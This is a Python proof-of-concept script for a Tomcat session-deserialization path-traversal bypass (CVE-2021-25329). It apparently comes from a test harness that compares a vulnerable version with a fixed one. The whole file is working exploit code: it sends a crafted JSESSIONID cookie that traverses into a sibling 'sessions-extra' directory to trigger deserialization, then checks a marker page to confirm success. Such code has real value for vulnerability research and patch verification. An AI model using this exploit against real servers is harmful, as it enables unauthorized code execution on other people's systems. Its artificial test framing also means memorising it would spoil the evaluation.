#!/usr/bin/env python3
"""CVE-2021-25329 residual PoC -- sibling-directory bypass of String.startsWith() check.

The CVE-2020-9484 fix (9.0.35) validates that the resolved session file path
starts with the FileStore directory using String.startsWith(). This is bypassable
when a sibling directory exists whose name is a string-prefix of the store directory
name (e.g., "sessions-extra" string-starts-with "sessions").

The JSESSIONID traverses one level up, then into sessions-extra/payload. The
canonical path /usr/local/tomcat/sessions-extra/payload.session passes the
String.startsWith("/usr/local/tomcat/sessions") check because the string
"/usr/local/tomcat/sessions-extra" starts with "/usr/local/tomcat/sessions".

The CVE-2021-25329 fix (9.0.43) switches to java.nio.file.Path.startsWith()
which compares path COMPONENTS, so "sessions-extra" != "sessions" and the
check correctly fails.

Expected behaviour:
  V1 (9.0.35): String check passes -- deserialization succeeds, marker written.
  V2 (9.0.43): Path check correctly blocks -- no deserialization, no marker.
"""

import requests
import time


def run(host: str = "127.0.0.1", port: int = 8080, flag: str = "") -> str:
    """Send the CVE-2021-25329 sibling-directory bypass request."""
    base = f"http://{host}:{port}"

    # Traverse one level up from sessions/ into sessions-extra/payload
    # Canonical path: /usr/local/tomcat/sessions-extra/payload.session
    # String check: starts with /usr/local/tomcat/sessions -> TRUE (bypass!)
    # Path check:   sessions-extra != sessions component -> FALSE (blocked)
    bypass_id = "../sessions-extra/payload"

    # Step 1: Send request with crafted JSESSIONID
    try:
        requests.get(
            f"{base}/index.html",
            cookies={"JSESSIONID": bypass_id},
            timeout=10,
        )
    except requests.RequestException:
        pass

    time.sleep(1)

    # Step 2: Check marker
    try:
        resp = requests.get(f"{base}/marker.jsp", timeout=5)
        return resp.text.strip()
    except requests.RequestException:
        return ""
